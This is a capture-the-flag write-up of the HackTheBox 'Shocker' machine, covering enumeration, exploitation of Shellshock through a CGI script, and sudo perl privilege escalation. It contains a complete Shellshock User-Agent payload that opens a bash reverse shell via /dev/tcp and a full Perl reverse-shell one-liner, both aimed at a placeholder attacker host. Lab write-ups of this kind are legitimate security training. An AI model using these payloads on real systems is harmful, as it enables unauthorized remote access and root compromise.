---
layout: post
title: HackTheBox Shocker
date: 2017-09-30
tags: [HackTheBox, Linux]
---

# Machine Synopsis

Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers. ([Source](https://www.hackthebox.com/machines/shocker))

# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.0046s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/19%OT=80%CT=1%CU=35637%PV=Y%DS=2%DC=T%G=Y%TM=6210DBF
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
OS:1NW6%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT     ADDRESS
1   3.87 ms 10.10.14.1
2   3.95 ms 10.10.10.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.89 seconds
```

Here is the website.

![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Shocker/website.png?raw=true)

`dirsearch` revealed some hidden directories.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Shocker]
└─# dirsearch -u 10.10.10.56 -w /usr/share/dirb/wordlists/common.txt   
...
[20:21:28] Starting: 
[20:21:30] 403 -  294B  - /cgi-bin/
[20:21:34] 200 -  137B  - /index.html
[20:21:40] 403 -  299B  - /server-status

Task Completed
```

Let’s check out the `/cgi-bin/` directory.

>   A CGI-bin is a folder used to house scripts that will interact with a Web browser to provide functionality for a Web page or website

Let’s run `dirsearch` again on the `/cgi-bin/` directory with some common extensions like `sh, cgi, bash`.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Shocker]
└─# dirsearch -u http://10.10.10.56/cgi-bin -w /usr/share/dirb/wordlists/common.txt -f -e sh,cgi,bash
...
[20:28:10] Starting: 
[20:29:19] 200 -  119B  - /cgi-bin/user.sh
...
```

There is a very interesting `user.sh` file.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Shocker]
└─# curl 10.10.10.56/cgi-bin/user.sh                                
Content-Type: text/plain

Just an uptime test script

 07:31:03 up 30 min,  0 users,  load average: 0.00, 0.02, 0.00
```

# Exploitation

Googling for `cgi bin exploits` resulted in a vulnerability called `ShellShock`.

According to this [GitHub](https://github.com/opsxcq/exploit-CVE-2014-6271) repository, we can check for the exploit by adjusting the `User Agent` to have some bash command.

![burp](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Shocker/burp.png?raw=true)

Let’s send a reverse shell bash script to gain access to `shelly`.

```bash
User Agent: () { :; }; echo; /bin/bash -c "exec bash -i &>/dev/tcp/<ip>/<port> <&1"
```

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Shocker]
└─# nc -nlvp 1337              
listening on [any] 1337 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.10.56] 44040
bash: no job control in this shell

shelly@Shocker:/usr/lib/cgi-bin$ cd /home/shelly
shelly@Shocker:/home/shelly$ cat user.txt
2ec24e11320026d1e70ff3e16695b233
```

# Privilege Escalation

Let’s check what `sudo` privileges can `shelly` run.

```bash
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

It seems like she can run `perl`. We can run a reverse shell command with `perl`.

```perl
sudo /usr/bin/perl -e 'use Socket;$i="<ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```bash
┌──(root㉿shiro)-[/home/shiro]
└─# nc -nlvp 6969            
listening on [any] 6969 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.10.56] 41834
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# cat root.txt
52c2715605d70c7619030560dc1ca467
```
